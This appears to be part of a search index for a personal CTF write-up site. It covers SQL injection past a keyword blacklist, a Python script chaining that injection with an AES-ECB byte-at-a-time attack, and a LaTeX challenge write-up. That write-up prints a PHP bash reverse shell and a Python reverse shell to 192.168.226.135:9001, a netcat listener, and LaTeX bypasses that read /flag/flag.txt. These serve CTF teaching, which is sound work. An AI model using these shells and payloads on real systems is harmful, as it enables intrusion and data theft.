where n is some number. I have yet to figure out how <code>printf()</code> calculates its offsets/addresses to read from based on the number we supply and the potential data types of varying arguments before the nth one.  <code>YBN24{FL4G_1N_4_ST4CK_XDDDDDD}</code></p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#post-ctf-lessons","title":"Post ctf lessons","text":""},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#essay-evaluator","title":"Essay evaluator","text":"<p>Usage of <code>...</code>  is a valid python object. https://stackoverflow.com/questions/772124/what-does-the-ellipsis-object-do</p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#rentahitman-1","title":"RentAHitman 1","text":"<p>Always consider the full scope of a potential vulnerability you are targeting. In this case, I was too focused on trying not to trip the blacklist detection. <pre><code>def detect_sqli(sql):  \n    # List of common SQL keywords and characters often used in SQL injection  \n    # TODO There are sqlite specific keywords such as ATTACH  \n    disallowed_patterns = [  \n        r\"SELECT\", r\"UNION\", r\"JOIN\", r\"FROM\", r\"WHERE\", r\"ON\",  \n        r\"OR\", r\"AND\", r\"NOT\", r\"IN\", r\"LIKE\", r\"DROP\", r\"INSERT\",  \n        r\"DELETE\", r\"UPDATE\", r\"EXEC\", r\"EXECUTE\", r\"CREATE\", r\"ALTER\",  \n        \"--\", \"#\", \";\", \"/*\", \"*/\", \"@@\", \"0x\", \"'\", \"\\\"\", \"`\", \"-\", \"/\", \"*\"  \n    ]  \n    # https://gist.github.com/cyberheartmi9/b4a4ff0f691be6b5c866450563258e86  \n    # TODO OR and AND can be bypassed with || and &amp;&amp;  \n\n    # Escape special characters and combine patterns into a single regex  \n    escaped_patterns = [re.escape(pattern) if not pattern.isalnum() else pattern for pattern in disallowed_patterns]  \n    combined_pattern = re.compile(\"|\".join(escaped_patterns), re.IGNORECASE)  \n\n    # Check if any disallowed pattern is found in the SQL query  \n    if combined_pattern.search(sql):  \n        return True  \n\n    return False\n\n@app.route('/filter', methods=[\"POST\"])  \ndef filter():  \n    if not session.get('is_logged_in'):  \n        return redirect(url_for('login'))  \n    with connect(g.uuid) as conn:  \n        print(f\"Mimetype is {request.mimetype_params}\")  \n        search = request.form['search']  \n        print(f\"Search term is \\n{search}\")  \n        # Split the terms and remove any containing blacklisted terms  \n        terms = search.split(\" \")  \n        query = \"SELECT name,location,description from targets\"  \n        for term in terms:  \n            if detect_sqli(term):  \n                print(f\"Removing blacklisted term {term}\")  \n                terms.remove(term)  \n        if terms:  \n            location_match = \" OR \".join(f\"name LIKE '%{term}%'\" for term in terms)  \n            name_match = \" OR \".join(f\"location LIKE '%{term}%'\" for term in terms)  \n            description_match = \" OR \".join(f\"description LIKE '%{term}%'\" for term in terms)  \n            query += \" WHERE \" + \" OR \".join([location_match,name_match,description_match])  \n            print(query)  \n        cursor = conn.execute(query)  \n        targets = cursor.fetchall()  \n        targets = list(targets)  \n    return jsonify(targets)\n</code></pre> However, preventing SQLI in this code consists of not only detection, but also removal of the terms. The terms are split by spaces into a list, then a for loop iterates and removes each term if SQLI is detected. The issue lies in the loop <pre><code>        for term in terms:  \n            if detect_sqli(term):  \n                print(f\"Removing blacklisted term {term}\")  \n                terms.remove(term)  \n</code></pre> If an item is removed during iteration, the loop will skip over the next item and no detection or removal of the item happens. https://stackoverflow.com/a/1207427. Hence, a query like <code>Next_term_is_skipped_SELECT %'/*You_are_free_to_execute_sql_here*/SELECT/**/BLAHBLAH.../**/;--</code> will allow for SQLI.  (Comments are used to bypass spaces and prevent query from being split)</p> <p></p> <p>Interestingly, chatgpt would have also pointed out the solution if you chatgpt'd hard enough https://chatgpt.com/share/674fd0a1-2870-800e-a95d-b7a7bc4bdc3e (Issue not mentioned) https://chatgpt.com/share/674fd0b0-6dec-800e-a95f-92c880c7ef2d (Issue mentioned)</p>"},{"location":"Ctfs/YesbutNo%202024%20Qual%20Writeups/#rentahitman-2","title":"RentAHitman 2","text":"<p>https://en.wikipedia.org/wiki/Padding_oracle_attack \"To my knowledge, Since AES-CBC block cipher is being used with a constant IV and a constant SALT, we are able to use an algorithm to guess each character one by one.\" <pre><code>import requests\nfrom Crypto.Util.number import bytes_to_long\nimport time\nimport string\nBASE_URL = \"https://rentahitman-com-1-rentahitman-chall.ybn.sg\" #TODO\n\n# range for possible flag chars\nascii_start = 32\nascii_end = 126\n\nblock_byte_start = 0\nblock_byte_end = 16\nblock_byte_size = 16\npw = \"\"\npayload_length = block_byte_end-len(pw)-1\nstarting_bytes = \"a\"*payload_length\nuuid = \"075dccc5-3b76-4a15-9306-e943c676132b\"\nsession = \"eyJpc19sb2dnZWRfaW4iOnRydWUsInVzZXJfaWQiOjN9.Z0n1ng.40KJnmVn8-Gur4fZ-4nCKLQEJCI\"\nGCLB = \"CKDj2fyUjcrZ5AEQAw\"\nUserAgent = \"YesButNo/1.0\"\n# attack until get last byte, b\"}\", attacks for more than 16 bytes\ndef get_encrypted_pw(pw):\n    response = requests.post(BASE_URL+\"/signup\", data={\"username\": pw, \"password\": pw},cookies={\"uuid\":uuid,\"session\":session,\"GCLB\":GCLB},headers={\"User-Agent\":UserAgent})\n    sqli = f\"-- dhadhlsjldas%'/**/UNION/**/SELECT/**/username,password,userId/**/FROM/**/users/**/WHERE/**/username='{pw}'--\"\n    response = requests.post(BASE_URL+\"/filter\", data={\"search\": sqli},cookies={\"uuid\":uuid,\"session\":session,\"GCLB\":GCLB},headers={\"User-Agent\":UserAgent})\n    data = response.json()[0]\n    if data[0] != pw:\n        print(f\"Error: {data} {pw}\")\n        exit()\n    return bytes.fromhex(data[1])\n\nchars = string.ascii_letters + string.digits\nfor i in range(16):\n    # payload = hex(bytes_to_long(starting_bytes))[2:]\n    actual_leak = get_encrypted_pw(starting_bytes)\n\n    # Starting payload for block attack\n    part_payload = starting_bytes + pw\n\n    # running through all possible printable chars\n    found = False\n    for ascii in chars:\n        char = ascii\n        if char in [\"'\", '\"', \"\\\\\", \" \"]:\n            continue\n        payload = part_payload + char\n        test_leak = get_encrypted_pw(payload)\n\n        # checking if the actual leak's block and test_leak's first block match\n        if test_leak[block_byte_start:block_byte_end] == actual_leak[block_byte_start:block_byte_end]:\n            print(f\"Found: {char}\")\n            pw += char\n            found = True\n            # going into next block already\n            if payload_length % block_byte_size == 1:\n                payload_length += block_byte_size - 1\n                block_byte_start += block_byte_size\n                block_byte_end += block_byte_size\n            else:\n                payload_length -= 1\n\n            starting_bytes = \"a\"*payload_length\n            part_payload = starting_bytes + pw\n            break\n    if not found:\n        break\nprint(pw)\n</code></pre> Sol by Baba is dead</p>"},{"location":"Dated%20blogs/03-02-2024/","title":"03 02 2024","text":"<p>Today marks the day I create this blog page. Hopefully the process of uploading it goes smoothly</p>"},{"location":"assets/TeXnically_Insecure_author_writeup/","title":"TeXnically Insecure","text":""},{"location":"assets/TeXnically_Insecure_author_writeup/#intro","title":"Intro","text":"<p>This challenge is meant to showcase a very obscure LaTeX exploit, paired with a nice flask exploit/misconfiguration. It therefore tries to block a lot of exploits to force people into the more obscure one. However, that did not work, as people found unintentional bypasses which will be described here. If you know an exploit that isn't listed here, feel free to tell me, I'd be interested :)</p>"},{"location":"assets/TeXnically_Insecure_author_writeup/#blocked-exploits","title":"Blocked Exploits","text":"<p>I did a bunch of research on known LaTeX exploits. These should all be properly blocked, as you can see in the source code. Some of them are also pretty cool though, so feel free to give these resources a read:</p> <ul> <li>https://book.jorianwoltjer.com/languages/latex</li> <li>https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection</li> <li>https://sk3rts.rocks/posts/bypassing-latex-filters/</li> <li>https://0day.work/hacking-with-latex/</li> <li>https://tex.stackexchange.com/tags/catcodes/info</li> <li>https://www.researchgate.net/publication/234829253_Are_text-only_data_formats_safe_or_use_this_LATEX_class_file_to_Pwn_your_computer</li> </ul>"},{"location":"assets/TeXnically_Insecure_author_writeup/#the-actual-exploit","title":"The actual exploit","text":"<p>Finding the intended exploit is a bit harder. Knowing that I was looking for the <code>filecontents</code> command, I found these 3 resources that mention it:</p> <ul> <li>https://texdoc.org/serve/latex2e.pdf/0</li> <li>https://de.mirrors.cicku.me/ctan/macros/latex/contrib/filecontents/filecontents.pdf</li> <li>actually mentioned as an exploit: https://0xdf.gitlab.io/2023/11/04/htb-topology.html</li> </ul> <p>I originally discovered it in the first resource while doing HTB Topology. Before you ask: No, this challenge is not based on Topology. This exploit was in no way intentional there, but happened to work. The only similarity is that both challenges require the exploitation of LaTeX.  The idea now is that using the semi-deprecated command called <code>filecontents</code>, you can write files to your current working directory (and probably subdirectories too). If the app was written in PHP, this would be fairly straightforward:</p> <pre><code>\\begin{filecontents}{shell.php}\n&lt;?php system(bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.226.135/9001 0&gt;&amp;1'); ?&gt;\n\\end{filecontents}\n</code></pre> <p>Now we could simply navigate to <code>shell.php</code> with our browser after setting up a netcat listener, and we'd have a shell. However, I wrote the challenge in Python, cause I honestly didn't wanna touch PHP. Sooo, we need a different approach. We can still use filecontents to write files, for example a <code>flask.py</code>. That doesn't actually do anything, at least not on its own. The next step would be to make the app restart. That causes it to reload its imports. Python always checks its current working directory first, so it'd be using our <code>flask.py</code> when importing flask. But let's first try writing our file with a python reverse shell:</p> <pre><code>\\begin{filecontents}{flask.py}\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.226.135\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\n\\end{filecontents}\n</code></pre> <p>Here is what that looks like:</p> <pre><code>%% LaTeX2e file `flask.py'\n%% generated by the `filecontents' environment\n%% from source `output' on 2024/12/19.\n%%\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.226.135\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\n</code></pre> <p>Again, in PHP this would work because PHP doesn't give a shit about anything. Python however sees the LaTeX comments that it doesn't understand and promptly crashes. Not helpful.  When digging deeper, we can find that there in another variant of the <code>filecontents</code> command, which is <code>filecontents*</code>. This is exactly the same thing, but without the comment. Problem solved. Now our <code>flask.py</code> looks like this:</p> <pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.226.135\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\n</code></pre> <p>While this is cool, we still need a way to restart the python server. There are a few interesting things to notice in the source code. Firstly, it uses supervisord to restart the app whenever it crashes. So if we can crash the app, it would restart, reload its imports and execute our reverse shell. If you've worked with flask before, you're probably well aware that while it may throw some errors here or there, it doesn't crash. But the configuration in use here is no default configuration. It uses <code>passthrough_errors=True</code> and <code>threaded=False</code>. The first is usually set to disable flasks error handling so that you can use an external debugger. For our purposes, it simply means that an actual error in flask itself will make it crash. Disabling threading simply means that one error actually kills it and it doesn't continue limping on in another thread. So all we need is some way to make the flask crash and we'll get our shell and with that the flag. There are likely countless ways you could do that. One way I stumbled upon is sending it the IP address <code>[1:1]</code> in a GET request, as you can see in the solve script. </p>"},{"location":"assets/TeXnically_Insecure_author_writeup/#full-exploit-chain","title":"Full exploit chain","text":"<p>First, creating our flask.py. Make sure you edit IP and port and don't have a <code>flask.py</code> already as we aren't using the overwrite argument here. Also, Python loves its indentation, so keep that in mind if you write a script.</p> <pre><code>\\begin{filecontents*}{flask.py}\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.226.135\",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\n\\end{filecontents*}\n</code></pre> <p>Next, Set up a netcat listener: <code>nc -lnvp 9001</code></p> <p>Lastly, crash the server, for example using the <code>crash</code> function in the solve script</p>"},{"location":"assets/TeXnically_Insecure_author_writeup/#bypasses","title":"Bypasses","text":"<p>The simplest bypass, and I can't believe I didn't catch that before releasing the challenge (only noticed during the CTF -.-), is writing commands into the <code>\\begin{}</code>, just like in the intended solution. The blacklist filters for commands beginning with <code>\\</code>, so it can be trivially bypassed this way. At this point, you can simply use <code>\\begin{input}{/flag/flag.txt}</code>. This bypass was then fixed in the revenge challenge. But there's more, as I came to learn. For example this <code>\\begin{inpu\\iftrue t\\fi}{\"/flag/flag.txt\"}</code>. Or this:</p> <pre><code>\\pdfobj stream file {/flag/flag.txt}\n\\pdfrefobj 1\nhallo\n</code></pre> <p>Or this:</p> <pre><code>\\ttfamily\n\\pdffiledump offset 0 length \\pdffilesize{/flag/flag.txt}{/flag/flag.txt}\n</code></pre> <p>So yeah, what we learn here is that LaTeX is utterly broken. If you didn't know already, it should be abundantly clear now :D</p>"},{"location":"blog/","title":"Blog","text":""}]}